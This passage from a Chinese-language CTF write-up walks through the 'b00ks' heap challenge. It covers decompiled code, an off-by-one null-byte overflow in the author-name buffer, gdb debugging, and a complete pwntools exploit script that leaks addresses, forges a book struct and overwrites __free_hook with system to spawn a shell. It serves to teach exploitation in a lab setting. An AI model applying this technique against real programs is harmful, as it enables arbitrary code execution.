class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> __int64 <span class="title">sub_F55</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> input; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">int</span> book_id; <span class="comment">// [rsp+4h] [rbp-1Ch]</span></span><br><span class="line">  <span class="keyword">void</span> *book_information_ptr; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">void</span> *book_name_ptr; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">void</span> *book_description_ptr; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  input = <span class="number">0</span>;                                    <span class="comment">// input在栈中</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nEnter book name size: &quot;</span>, *(_QWORD *)&amp;input);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;input);                 <span class="comment">// 输入book_name_size</span></span><br><span class="line">  <span class="keyword">if</span> ( input &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Enter book name (Max 32 chars): &quot;</span>, &amp;input);</span><br><span class="line">    book_name_ptr = <span class="built_in">malloc</span>(input);              <span class="comment">// 创建一个book_name_size大小的堆</span></span><br><span class="line">    <span class="keyword">if</span> ( book_name_ptr )</span><br><span class="line">    &#123;                                           <span class="comment">// book_name_size大小的堆创建成功</span></span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)read_data_to_heap(book_name_ptr, input - <span class="number">1</span>) )<span class="comment">// 向堆中输入book_name</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;fail to read name&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        input = <span class="number">0</span>;                              <span class="comment">// input清零</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\nEnter book description size: &quot;</span>, *(_QWORD *)&amp;input);</span><br><span class="line">        __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;input);           <span class="comment">// 输入书类型的大小</span></span><br><span class="line">        <span class="keyword">if</span> ( input &gt;= <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          book_description_ptr = <span class="built_in">malloc</span>(input); <span class="comment">// 创建book_description_size大小的堆</span></span><br><span class="line">          <span class="keyword">if</span> ( book_description_ptr )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Enter book description: &quot;</span>, &amp;input);</span><br><span class="line">            <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)read_data_to_heap(book_description_ptr, input - <span class="number">1</span>) )<span class="comment">// 将book_description写入堆中</span></span><br><span class="line">            &#123;</span><br><span class="line">              <span class="built_in">printf</span>(<span class="string">&quot;Unable to read description&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              book_id = sub_B24();              <span class="comment">// 为书籍分配book_id</span></span><br><span class="line">              <span class="keyword">if</span> ( book_id == <span class="number">-1</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Library is full&quot;</span>);</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">              &#123;</span><br><span class="line">                book_information_ptr = <span class="built_in">malloc</span>(<span class="number">32uLL</span>);<span class="comment">// 创建大小为32的堆</span></span><br><span class="line">                <span class="keyword">if</span> ( book_information_ptr )</span><br><span class="line">                &#123;</span><br><span class="line">                  *((_DWORD *)book_information_ptr + <span class="number">6</span>) = input;<span class="comment">// 存放书类型的大小</span></span><br><span class="line">                  *((_QWORD *)book_struct_ptr + book_id) = book_information_ptr;</span><br><span class="line">                  *((_QWORD *)book_information_ptr + <span class="number">2</span>) = book_description_ptr;</span><br><span class="line">                  *((_QWORD *)book_information_ptr + <span class="number">1</span>) = book_name_ptr;</span><br><span class="line">                  *(_DWORD *)book_information_ptr = ++::book_id;<span class="comment">// 存放book_id</span></span><br><span class="line">                  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Unable to allocate book struct&quot;</span>);</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Fail to allocate memory&quot;</span>, &amp;input);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;Malformed size&quot;</span>, &amp;input);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;                                           <span class="comment">// book_name_size大小的堆未创建成功</span></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;unable to allocate enough space&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Malformed size&quot;</span>, &amp;input);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( book_name_ptr )</span><br><span class="line">    <span class="built_in">free</span>(book_name_ptr);</span><br><span class="line">  <span class="keyword">if</span> ( book_description_ptr )</span><br><span class="line">    <span class="built_in">free</span>(book_description_ptr);</span><br><span class="line">  <span class="keyword">if</span> ( book_information_ptr )</span><br><span class="line">    <span class="built_in">free</span>(book_information_ptr);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>函数的具体执行流程就不仔细说了，看一下函数 sub_B24()，这个函数主要用来为创建的书籍进行分配 ID：<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1599526492302-4f387dc1-426c-49e0-8722-fe62199710f9.png#align=left&display=inline&height=229&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20200908085444.png&originHeight=229&originWidth=550&size=13259&status=done&style=none&width=550" alt="QQ截图20200908085444.png"><br>回到前一个函数，有：<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1599526875961-d0617db7-b941-417b-9a87-f298268fafc3.png#align=left&display=inline&height=183&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20200908090104.png&originHeight=183&originWidth=614&size=22674&status=done&style=none&width=614" alt="QQ截图20200908090104.png"><br>从上面的 if 语句，我们可以得到一个 struct 结构体，如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">book</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">char</span> *name_ptr;</span><br><span class="line">    <span class="keyword">char</span> *description_ptr;</span><br><span class="line">    <span class="keyword">int</span> size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>双击上图中的 book_struct_ptr，进入：<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1599527032187-9489f3b8-cfec-46a9-8eff-bfb93b312954.png#align=left&display=inline&height=141&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20200908090343.png&originHeight=141&originWidth=866&size=18718&status=done&style=none&width=866" alt="QQ截图20200908090343.png"><br>仔细的研究一下这个图：<br>off_202018 地址中存放的是图书作者名指针，这个指针指向的地址是 unk_202060<br>off_202010 地址中存放的是图书的结构体指针，这个指针指向的地址为 unk_202040<br>还记得之前 for 循环溢出（off-by-one）的问题吗？由于 off_202018 和 off_202010 紧紧联系在一起，因此两个指针所指向的内容 unk_202060 与 unk_202040 也是连接在一起的。如果我们输入 32 个字节的作者名字符串，那么循环多出来的一次会将\x00 写入到 off_202010 起始第一个字节（也就是 unk_202060 的第一个字节），进一步来说会将创建的第一本图书结构体的低字节覆盖掉。<br>这样说你觉得可能没有什么概念，但是别担心，之后的动态调试会进行详细的讲解。</p>
<h2 id="修改图书内容功能分析"><a href="#修改图书内容功能分析" class="headerlink" title="修改图书内容功能分析"></a>修改图书内容功能分析</h2><p>返回 main 函数的界面，进入 sub_E17 函数：<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1599527812351-16ce5138-fc3b-455e-a2d2-a200c3889fab.png#align=left&display=inline&height=629&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20200908091642.png&originHeight=629&originWidth=1092&size=46350&status=done&style=none&width=1092" alt="QQ截图20200908091642.png"><br>大致看一下这个函数，输入 edit_id，根据这个变量对录入的 book 结构体的内容进行修改，大致了解一下就行了。</p>
<h2 id="删除图书功能"><a href="#删除图书功能" class="headerlink" title="删除图书功能"></a>删除图书功能</h2><p>接下来是删除图书的功能，进入函数 sub_BBD<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1599528218553-e2d874d3-df2a-4860-9c2b-e3400834f22f.png#align=left&display=inline&height=568&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20200908092329.png&originHeight=568&originWidth=1119&size=44092&status=done&style=none&width=1119" alt="QQ截图20200908092329.png"><br>这个函数也是通过 book_id 来对图书的信息进行删除，对 struct 结构体中的内容进行了 free。</p>
<h2 id="打印图书信息功能分析"><a href="#打印图书信息功能分析" class="headerlink" title="打印图书信息功能分析"></a>打印图书信息功能分析</h2><p>进入函数 sub_D1F()：<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1599528500345-1b6385f1-55bc-42a2-af77-eb8ef92e5c28.png#align=left&display=inline&height=370&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20200908092752.png&originHeight=370&originWidth=819&size=31334&status=done&style=none&width=819" alt="QQ截图20200908092752.png"><br>这个函数显而易见，对图书的每一个结构体进行了遍历，并打印出 book 结构体的信息。</p>
<h2 id="修改作者名功能分析"><a href="#修改作者名功能分析" class="headerlink" title="修改作者名功能分析"></a>修改作者名功能分析</h2><p><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1599528638791-dfdd6124-e6c0-400f-b947-cfc18a2d6f1b.png#align=left&display=inline&height=132&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20200908093027.png&originHeight=132&originWidth=619&size=10068&status=done&style=none&width=619" alt="QQ截图20200908093027.png"><br>简单的分析一下，依然是直接调用 read_data_to_heap 函数将新输入的作者名写入到堆中，用户名的长度依然是 32 字节。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>到目前为止，程序的所有函数关键点已经分析完成，我们需要记以下下几个关键点：</p>
<ul>
<li>作者名存放在 off_202018 地址的指针中，这个指针指向的空间大小一共 32 个字节。</li>
<li>图书结构体指针存放在地址 off_202010 中</li>
<li>sub_9F5()函数存在 off-by-one 漏洞，**在首次创建作者名或修改作者名的时候，****如果填写 32 个字节的任意字符串，那么就会导致<code>\x00</code>溢出到 off_202018 的低位（这一点很重要！）**</li>
</ul>
<h1 id="思路讲解及动态调试"><a href="#思路讲解及动态调试" class="headerlink" title="思路讲解及动态调试"></a>思路讲解及动态调试</h1><p>到了动态调试的部分了，记得把系统的 ASLR 关闭并授予程序权限以运行。<br>先来贴一下 exp 吧，没有 exp 进行讲解就没有灵魂：</p>
<blockquote>
<p>exp 大致看一下，有个印象就行了</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">context(log_level=<span class="string">&#x27;DEBUG&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">name_len, name, desc_len, desc</span>):</span></span><br><span class="line">    p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Enter book name size: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(name_len))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Enter book name (Max 32 chars): &quot;</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Enter book description size: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(desc_len))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Enter book description: &quot;</span>)</span><br><span class="line">    p.sendline(desc)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Enter the book id you want to delete: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index, desc</span>):</span></span><br><span class="line">    p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Enter the book id you want to edit: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Enter new book description: &quot;</span>)</span><br><span class="line">    p.sendline(desc)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">log.info(<span class="string">&quot;Loading program...&quot;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./b00ks&quot;</span>)</span><br><span class="line">log.success(<span class="string">&quot;Load success!&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Enter author name: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;a&quot;</span> * <span class="number">32</span>)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">log.info(<span class="string">&quot;Off-BY-NULL!&quot;</span>)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">create(<span class="number">10</span>, <span class="string">&quot;book1_name&quot;</span>, <span class="number">200</span>, <span class="string">&quot;book1_desc&quot;</span>)</span><br><span class="line">create(<span class="number">0x21000</span>, <span class="string">&quot;book2_name&quot;</span>, <span class="number">0x21000</span>, <span class="string">&quot;book2_desc&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">log.info(<span class="string">&quot;Leaking book_1&#x27;s address...&quot;</span>)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Author: &quot;</span>)</span><br><span class="line">p.recv(<span class="number">32</span>)</span><br><span class="line">book1_addr = u64(p.recv(<span class="number">6</span>) + <span class="string">&#x27;\x00\x00&#x27;</span>)</span><br><span class="line">log.success(<span class="string">&quot;Book1_addr : 0x%x&quot;</span> % book1_addr)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">log.info(<span class="string">&quot;Calculating book_2&#x27;s address...&quot;</span>)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">book2_addr = book1_addr + <span class="number">0x30</span></span><br><span class="line">log.success(<span class="string">&quot;Book2_addr : 0x%x&quot;</span> % book2_addr)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">log.info(<span class="string">&quot;Prepare to construct a fake book...&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x70</span> + p64(<span class="number">1</span>) + p64(book2_addr + <span class="number">8</span>) + p64(book2_addr + <span class="number">8</span>) + p64(<span class="number">0xffff</span>)</span><br><span class="line">edit(<span class="number">1</span>, payload)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">log.success(<span class="string">&quot;Fake book constructed! And two pointers were set to book2.&quot;</span>)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">log.info(<span class="string">&quot;Off-BY-NULL again! Now Book1 was set to the fake book.&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;5&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Enter author name: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;a&#x27;</span> * <span class="number">32</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">log.info(<span class="string">&quot;Leaking mmap address...&quot;</span>)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Name: &quot;</span>)</span><br><span class="line">mmap_addr = u64(p.recv(<span class="number">6</span>) + <span class="string">&#x27;\x00\x00&#x27;</span>)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">log.success(<span class="string">&quot;Mmap address : 0x%x&quot;</span> % mmap_addr)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">log.info(<span class="string">&quot;Calculating libc&#x27;s base&quot;</span>)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">libc_addr = <span class="number">0x7ffff79e4000</span>   <span class="comment"># Change it if doesn&#x27;t work!</span></span><br><span class="line"><span class="comment">#这里存在另一种写法，之后再说。</span></span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">log.success(<span class="string">&quot;Libc&#x27;s addr : 0x%x&quot;</span> % libc_addr)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">log.info(<span class="string">&quot;Searching __free_hook &amp; system &amp; /bin/sh in libc...&quot;</span>)</span><br><span class="line">free_hook = libc.symbols[<span class="string">&quot;__free_hook&quot;</span>] + libc_addr</span><br><span class="line">system = libc.symbols[<span class="string">&quot;system&quot;</span>] + libc_addr</span><br><span class="line">binsh = libc.search(<span class="string">&quot;/bin/sh&quot;</span>).<span class="built_in">next</span>() + libc_addr</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">log.success(<span class="string">&quot;__free_hook address: 0x%x&quot;</span> % free_hook)</span><br><span class="line">log.success(<span class="string">&quot;system address: 0x%x&quot;</span> % system)</span><br><span class="line">log.success(<span class="string">&quot;/bin/sh address: 0x%x&quot;</span> % binsh)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">log.info(<span class="string">&quot;Changing book2&#x27;s pointers...&quot;</span>)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">payload2 = p64(binsh) + p64(free_hook)</span><br><span class="line">edit(<span class="number">1</span>, payload2)</span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">log.success(<span class="string">&quot;Book2&#x27;s name and description&#x27;s pointer has been changed!&quot;</span>)</span><br><span class="line">log.info(<span class="string">&quot;Book2&#x27;s name --&gt; /bin/sh&quot;</span>)</span><br><span class="line">log.info(<span class="string">&quot;Book2&#x27;s desc --&gt; free_hook&quot;</span>)</span><br><span class="line">log.info(<span class="string">&quot;Prepare to change book2&#x27;s description, also known as __free_hook.&quot;</span>)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">payload3 = p64(system)</span><br><span class="line">edit(<span class="number">2</span>,payload3)</span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">log.success(<span class="string">&quot;Now __free_hook&#x27;s address is system&#x27;s address!&quot;</span>)</span><br><span class="line">log.info(<span class="string">&quot;We just need to free book2.&quot;</span>)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">log.info(<span class="string">&quot;Ready in 3 seconds...&quot;</span>)</span><br><span class="line">time.sleep(<span class="number">3</span>)</span><br><span class="line">log.success(<span class="string">&quot;PWN!!&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>gdb 调试，如下图所示：<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1599982490929-37023677-899f-4a28-9da9-80fde31f3d1d.png#align=left&display=inline&height=564&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20200913153435.png&originHeight=564&originWidth=723&size=109642&status=done&style=none&width=723" alt="QQ截图20200913153435.png"><br>从上面这张图看到，一开始输入 32 个字节的任意字符：“aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa”，这样我们就将存放作者名称的填满，并且使其发生了溢出。<br>对应的 payload 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(<span class="string">&quot;Enter author name: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;a&quot;</span> * <span class="number">32</span>)</span><br></pre></td></tr></table></figure>

<p>接着我们**Ctrl+C****进入调试界面**，定位刚刚输入的字符串，我们介绍两种方式</p>
<h2 id="1、定位输入的作者名的地址"><a href="#1、定位输入的作者名的地址" class="headerlink" title="1、定位输入的作者名的地址"></a>1、定位输入的作者名的地址</h2><h3 id="第一种方式"><a href="#第一种方式" class="headerlink" title="第一种方式"></a>第一种方式</h3><p>因为在 IDA 里可以看出作者名存放在 off_202018（）中，因此我们只需要知道<strong>代码段的基地址</strong>再加上 off_202018 的偏移就可以找到存放作者名的指针了。<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1599531848175-30ee32ab-c0fa-4786-a29a-f9f7e9bd5d4d.png#align=left&display=inline&height=63&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20200908102353.png&originHeight=63&originWidth=580&size=5697&status=done&style=none&width=580" alt="QQ截图20200908102353.png"><br>off_202018 指的是在偏移为 0x202018，那么将代码段（code 段）的起始地址加上 0x202018 的偏移就可以得到存放作者名指针的地址了，可以使用 pwngdb 中的“vmmap”查看一下代码段的起始地址：<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1599982691469-fca923ef-becc-4b89-a2a1-c082ca5d8cfd.png#align=left&display=inline&height=365&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20200913153803.png&originHeight=365&originWidth=848&size=80127&status=done&style=none&width=848" alt="QQ截图20200913153803.png"><br>第一行的红色字段就是代码段的范围，其范围为：0x555555554000-0x555555556000<br>因此，存放作者名指针的地址为：0x555555754000 + 0x202018 = 0x555555756018<br>使用命令“x/16gx 0x555555756018”查看一下：<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1599982735784-20771301-41f0-48d0-9918-5efc4f7f6830.png#align=left&display=inline&height=181&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20200913153847.png&originHeight=181&originWidth=532&size=22832&status=done&style=none&width=532" alt="QQ截图20200913153847.png"><br>从上图我们可以看到 0x555555756018 处存放 0x0000555555756040，而地址 0x0000555555756040 存放的就是我们输入的 32 个字节的作者名。</p>
<hr>
<p>附：堆中的字符读取顺序如下：（请注意小端序）<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1599537359544-9e9caeca-c765-44a3-876a-809f677075a8.png#align=left&display=inline&height=128&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20200908115547.png&originHeight=128&originWidth=379&size=9655&status=done&style=none&width=379" alt="QQ截图20200908115547.png"></p>
<blockquote>
<p><strong>堆的生长方向是从低地址向高地址生长的</strong></p>
</blockquote>
<hr>
<h3 id="第二种方式"><a href="#第二种方式" class="headerlink" title="第二种方式"></a>第二种方式</h3><p>我们可以使用 pwngdb 的 search 命令进行搜索：<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1599982837698-f4c56042-e7d8-4b0d-9a5c-50790da3559e.png#align=left&display=inline&height=74&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20200913154030.png&originHeight=74&originWidth=814&size=13740&status=done&style=none&width=814" alt="QQ截图20200913154030.png"><br>可以看到字符串存放的地址 0x555555756040，输入命令 x/16gx 0x555555756040 就可以看到字符串了。<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1599982881448-c70847b8-eecd-4a97-b4b7-3f360364c551.png#align=left&display=inline&height=182&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20200913154113.png&originHeight=182&originWidth=543&size=20095&status=done&style=none&width=543" alt="QQ截图20200913154113.png"><br>请注意上图红方框中的\x00，这个就是通过第 33 次 for 循环写入的。</p>
